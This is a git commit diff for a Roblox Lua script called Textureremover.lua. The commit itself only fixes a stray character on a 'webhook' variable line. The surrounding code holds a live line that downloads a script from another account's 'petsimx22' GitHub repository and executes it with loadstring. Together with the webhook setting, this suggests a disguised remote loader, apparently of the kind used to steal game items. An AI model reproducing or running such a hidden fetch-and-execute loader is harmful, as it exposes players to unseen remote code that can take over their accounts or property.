d52778e8817e99c77875e4ca9d31bcc6f801a9c7
NotValra <124619531+NotValra@users.noreply.github.com>
2024-03-21 21:42:41 +0100

    Update Textureremover.lua

--- Textureremover.lua
+++ Textureremover.lua
@@ -74,7 +74,7 @@ wait(1) -- Adjust the duration as needed
 loadingscreen = false 
 delay = 0 
 farmui = false
-webhook = ""t
+webhook = ""
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
 end
 
